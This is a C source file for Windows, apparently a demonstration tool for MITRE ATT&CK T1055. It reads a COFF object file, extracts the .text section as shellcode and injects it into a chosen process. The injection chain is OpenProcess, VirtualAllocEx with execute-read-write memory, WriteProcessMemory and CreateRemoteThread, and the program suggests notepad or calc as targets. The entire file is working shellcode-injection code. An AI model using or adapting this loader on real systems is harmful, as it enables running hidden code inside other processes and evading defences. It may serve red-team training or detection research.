#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

#pragma pack(push, 1)
typedef struct {
    WORD Machine;
    WORD NumberOfSections;
    DWORD TimeDateStamp;
    DWORD PointerToSymbolTable;
    DWORD NumberOfSymbols;
    WORD SizeOfOptionalHeader;
    WORD Characteristics;
} COFF_HEADER;

typedef struct {
    BYTE Name[8];
    DWORD VirtualSize;
    DWORD VirtualAddress;
    DWORD SizeOfRawData;
    DWORD PointerToRawData;
    DWORD PointerToRelocations;
    DWORD PointerToLinenumbers;
    WORD NumberOfRelocations;
    WORD NumberOfLinenumbers;
    DWORD Characteristics;
} COFF_SECTION_HEADER;
#pragma pack(pop)

typedef struct {
    COFF_HEADER header;
    COFF_SECTION_HEADER* sections;
    BYTE* rawData;
    DWORD fileSize;
} COFF_FILE;

// Enhanced error diagnostics
void DiagnoseInjectionError(DWORD error, LPVOID address, DWORD pid, SIZE_T shellcodeSize) {
    printf("\n=== INJECTION FAILURE ANALYSIS ===\n");
    printf("Error Code: %d\n", error);
    printf("Target Address: 0x%p\n", address);
    printf("Target PID: %d\n", pid);
    printf("Shellcode Size: %d bytes\n", shellcodeSize);
    
    switch(error) {
        case 5:
            printf(" ERROR_ACCESS_DENIED\n");
            printf("Possible Causes:\n");
            printf("  1. Invalid memory address in shellcode\n");
            printf("  2. Architecture mismatch (x86 vs x64)\n");
            printf("  3. Process protection (PPL/Protected Process)\n");
            printf("  4. Integrity level violation\n");
            printf("  5. Code signature requirements not met\n");
            break;
        case 6:
            printf(" ERROR_INVALID_HANDLE\n");
            printf("Process handle is invalid\n");
            break;
        case 8:
            printf(" ERROR_NOT_ENOUGH_MEMORY\n");
            printf("Insufficient memory for thread creation\n");
            break;
        case 87:
            printf(" ERROR_INVALID_PARAMETER\n");
            printf("Invalid parameters passed to CreateRemoteThread\n");
            break;
        case 299:
            printf(" ERROR_PARTIAL_COPY\n");
            printf("Only partial memory was written\n");
            break;
        default:
            printf(" Unknown error: %d\n", error);
    }
    printf("==================================\n\n");
}

// Check if process is 32-bit
BOOL IsProcess32Bit(DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProcess) return FALSE;
    
    BOOL isWow64 = FALSE;
    BOOL success = IsWow64Process(hProcess, &isWow64);
    
    CloseHandle(hProcess);
    return success && isWow64;
}

// List available processes for testing
void ListProcesses() {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("Failed to create process snapshot\n");
        return;
    }
    
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);
    
    printf("\n=== AVAILABLE PROCESSES (PID - Name) ===\n");
    if (Process32First(hSnapshot, &pe)) {
        int count = 0;
        do {
            // Show only common test processes
            if (strstr(pe.szExeFile, "notepad") || 
                strstr(pe.szExeFile, "calc") ||
                strstr(pe.szExeFile, "mspaint") ||
                count < 10) { // Show first 10 processes
                printf("  %6d - %s", pe.th32ProcessID, pe.szExeFile);
                if (IsProcess32Bit(pe.th32ProcessID)) {
                    printf(" [32-bit]");
                }
                printf("\n");
                count++;
            }
        } while (Process32Next(hSnapshot, &pe) && count < 20);
    }
    
    CloseHandle(hSnapshot);
    printf("========================================\n");
}

COFF_FILE* ParseCOFF(const char* filename) {
    FILE* file = fopen(filename, "rb");
    if (!file) {
        printf("Failed to open file: %s\n", filename);
        return NULL;
    }
    
    fseek(file, 0, SEEK_END);
    DWORD fileSize = ftell(file);
    fseek(file, 0, SEEK_SET);
    
    BYTE* rawData = (BYTE*)malloc(fileSize);
    if (!rawData) {
        fclose(file);
        return NULL;
    }
    
    size_t bytesRead = fread(rawData, 1, fileSize, file);
    fclose(file);
    
    if (bytesRead != fileSize) {
        printf("File read incomplete: %zu/%d bytes\n", bytesRead, fileSize);
        free(rawData);
        return NULL;
    }
    
    COFF_FILE* coff = (COFF_FILE*)malloc(sizeof(COFF_FILE));
    if (!coff) {
        free(rawData);
        return NULL;
    }
    
    memcpy(&coff->header, rawData, sizeof(COFF_HEADER));
    coff->fileSize = fileSize;
    coff->rawData = rawData;
    
    coff->sections = (COFF_SECTION_HEADER*)malloc(sizeof(COFF_SECTION_HEADER) * coff->header.NumberOfSections);
    BYTE* sectionStart = rawData + sizeof(COFF_HEADER);
    memcpy(coff->sections, sectionStart, sizeof(COFF_SECTION_HEADER) * coff->header.NumberOfSections);
    
    return coff;
}

BOOL InjectShellcode(DWORD pid, BYTE* shellcode, SIZE_T shellcodeSize) {
    printf("[1/4] Opening process PID: %d... ", pid);
    
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        DWORD error = GetLastError();
        printf("FAILED (Error: %d)\n", error);
        return FALSE;
    }
    printf("SUCCESS\n");
    
    printf("[2/4] Allocating memory (%d bytes)... ", shellcodeSize);
    LPVOID remoteMemory = VirtualAllocEx(hProcess, NULL, shellcodeSize, 
                                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMemory) {
        DWORD error = GetLastError();
        printf("FAILED (Error: %d)\n", error);
        CloseHandle(hProcess);
        return FALSE;
    }
    printf("SUCCESS at 0x%p\n", remoteMemory);
    
    printf("[3/4] Writing shellcode... ");
    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(hProcess, remoteMemory, shellcode, shellcodeSize, &bytesWritten)) {
        DWORD error = GetLastError();
        printf("FAILED (Error: %d, Written: %zu/%zu bytes)\n", error, bytesWritten, shellcodeSize);
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    printf("SUCCESS (%zu/%zu bytes)\n", bytesWritten, shellcodeSize);
    
    printf("[4/4] Creating remote thread... ");
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 
                                      (LPTHREAD_START_ROUTINE)remoteMemory, NULL, 0, NULL);
    if (!hThread) {
        DWORD error = GetLastError();
        printf("FAILED (Error: %d)\n", error);
        DiagnoseInjectionError(error, remoteMemory, pid, shellcodeSize);
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    DWORD threadId = GetThreadId(hThread);
    printf("SUCCESS (Thread ID: %d)\n", threadId);
    
    printf("Waiting for thread completion... ");
    WaitForSingleObject(hThread, 5000); // Wait up to 5 seconds
    
    DWORD exitCode;
    if (GetExitCodeThread(hThread, &exitCode)) {
        printf("Thread exited with code: 0x%08X\n", exitCode);
    } else {
        printf("Thread still running or failed to get exit code\n");
    }
    
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return TRUE;
}

BYTE* ExtractShellcode(COFF_FILE* coff, SIZE_T* shellcodeSize) {
    for (WORD i = 0; i < coff->header.NumberOfSections; i++) {
        if (memcmp(coff->sections[i].Name, ".text", 5) == 0) {
            *shellcodeSize = coff->sections[i].SizeOfRawData;
            if (*shellcodeSize == 0) {
                printf("Warning: .text section has zero size\n");
                return NULL;
            }
            
            BYTE* shellcode = (BYTE*)malloc(*shellcodeSize);
            if (!shellcode) {
                printf("Memory allocation failed for shellcode\n");
                return NULL;
            }
            
            DWORD offset = coff->sections[i].PointerToRawData;
            if (offset + *shellcodeSize > coff->fileSize) {
                printf("Error: .text section exceeds file bounds\n");
                free(shellcode);
                return NULL;
            }
            
            memcpy(shellcode, coff->rawData + offset, *shellcodeSize);
            printf("Found .text section: %d bytes\n", *shellcodeSize);
            return shellcode;
        }
    }
    return NULL;
}

void FreeCOFF(COFF_FILE* coff) {
    if (coff) {
        free(coff->sections);
        free(coff->rawData);
        free(coff);
    }
}

int main(int argc, char* argv[]) {
    printf("=== COFF Parser Enhanced - MITRE ATT&CK T1055 ===\n");
    
    if (argc != 3) {
        printf("Usage: %s <coff_file> <target_pid>\n", argv[0]);
        printf("Example: %s minimal_shellcode.obj 1234\n\n", argv[0]);
        
        ListProcesses();
        printf("\nRecommended test targets:\n");
        printf("  - notepad.exe (32-bit)\n");
        printf("  - calc.exe (32-bit)\n");
        printf("  - mspaint.exe (32-bit)\n");
        return 1;
    }
    
    const char* coffFilename = argv[1];
    DWORD targetPid = atoi(argv[2]);
    
    printf("Target PID: %d\n", targetPid);
    
    // Validate target process
    if (!IsProcess32Bit(targetPid)) {
        printf(" WARNING: Target process may not be 32-bit or inaccessible\n");
        printf("   This tool only supports 32-bit processes\n");
    }
    
    printf("\n[1/3] Parsing COFF file: %s\n", coffFilename);
    COFF_FILE* coff = ParseCOFF(coffFilename);
    if (!coff) {
        printf(" Failed to parse COFF file\n");
        return 1;
    }
    
    printf("COFF Header Info:\n");
    printf("  Machine: 0x%04X (%s)\n", coff->header.Machine, 
           coff->header.Machine == 0x014C ? "x86" : "Unknown");
    printf("  Sections: %d\n", coff->header.NumberOfSections);
    printf("  Characteristics: 0x%04X\n", coff->header.Characteristics);
    
    printf("\n[2/3] Extracting shellcode from .text section\n");
    SIZE_T shellcodeSize;
    BYTE* shellcode = ExtractShellcode(coff, &shellcodeSize);
    if (!shellcode) {
        printf(" No .text section found or extraction failed\n");
        FreeCOFF(coff);
        return 1;
    }
    
    printf("\n[3/3] Attempting process injection\n");
    if (InjectShellcode(targetPid, shellcode, shellcodeSize)) {
        printf("\n SUCCESS: Process injection completed!\n");
        printf("MITRE ATT&CK T1055 demonstrated successfully!\n");
    } else {
        printf("\n FAILED: Process injection failed\n");
    }
    
    free(shellcode);
    FreeCOFF(coff);
    
    printf("\nPress Enter to exit...");
    getchar();
    return 0;
}